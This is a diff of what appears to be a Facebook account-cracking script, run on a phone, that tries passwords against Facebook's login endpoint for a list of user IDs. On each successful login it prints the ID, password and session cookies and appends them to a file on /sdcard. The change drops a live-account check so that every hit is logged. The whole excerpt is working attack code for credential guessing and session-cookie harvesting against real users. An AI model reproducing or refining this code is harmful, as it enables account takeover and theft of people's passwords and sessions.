@@ -86,22 +86,15 @@ for user in dx:
         url = 'https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100'
         response = Session.post(url, data=data, headers=headers, cookies=cookies, allow_redirects=False)
 
-        print(f"🔍 Response Code: {response.status_code}")  # <-- Added response code print
-
         cookie_data = Session.cookies.get_dict()
 
         if "c_user" in cookie_data:
             cid = cookie_data["c_user"]
             coki = ";".join([f"{k}={v}" for k, v in cookie_data.items()])
-            if "live" in check_lock(cid):
-                if '%3A-1%3A-1' in coki:
-                    print(f"\n✅ NV-LOGIN: {cid}|{pw}")
-                    open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                else:
-                    print(f"\n✅ OK: {cid}|{pw}")
-                    print(f"🍪 Cookie: {coki}")
-                    open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                    oks.append(cid)
+            print(f"\n✅ OK: {cid}|{pw}")
+            print(f"🍪 Cookie: {coki}")
+            open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+            oks.append(cid)
 
         elif 'checkpoint' in cookie_data:
             print(f"\n⚠️ CHECKPOINT: {ids}|{pw}")
@@ -116,6 +109,7 @@ for user in dx:
         time.sleep(2)
     loop += 1
     linex()
+    print(f"🔍 Response Code: {response.status_code}")  # <-- Added response code print
     print("🔚 PROCESS COMPLETE.")
     linex()
     input("➡️ PRESS ENTER TO LOGIN NEXT ID...")
